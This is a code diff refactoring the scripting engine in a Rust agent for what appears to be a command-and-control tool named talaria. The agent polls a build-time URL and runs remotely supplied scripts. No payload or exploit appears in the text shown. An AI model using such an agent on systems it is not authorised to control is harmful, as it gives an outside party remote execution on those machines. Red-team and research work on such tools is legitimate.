@@ -1,19 +1,18 @@
 pub mod agent;
 pub mod network;
-pub mod scripting;
 pub mod state;
-pub mod stdlib;
 
-use scripting::ScriptingEngine;
 use state::State;
 use std::process::Output;
 use std::sync::Arc;
 use talaria::helper::*;
 use talaria::protocol::*;
+use talaria::scripting::ScriptingEngine;
 use tokio::process::Command;
 use tokio::sync::RwLock;
 use tokio::task;
 use tokio::time::{self, Duration};
+
 const URL: &'static str = env!("URL", "environment variable `URL` not defined");
 
 const POLL_INTERVAL_MS: &'static str = env!(
@@ -112,32 +111,28 @@ async fn eval(state: Arc<RwLock<State>>) {
                 .push_response(response_body, instruction.0);
         }
         AgentInstructionBody::Script(script) => {
-            let state_unmoved = state.clone();
-
             task::spawn_blocking(async move || {
-                let mut engine = ScriptingEngine::new(state.clone()).await;
+                let mut engine = ScriptingEngine::new();
                 engine.execute(&script.source).await;
             })
             .await;
 
             let response_body = AgentResponseBody::ScriptResponse;
 
-            state_unmoved
+            state
                 .write()
                 .await
                 .push_response(response_body, instruction.0);
         }
         AgentInstructionBody::Rhai(source) => {
-            let state_unmoved = state.clone();
-
             task::spawn(async move {
-                let mut engine = ScriptingEngine::new(state.clone()).await;
+                let mut engine = ScriptingEngine::new();
                 engine.execute(&source).await;
             });
 
             let response_body = AgentResponseBody::ScriptResponse;
 
-            state_unmoved
+            state
                 .write()
                 .await
                 .push_response(response_body, instruction.0);
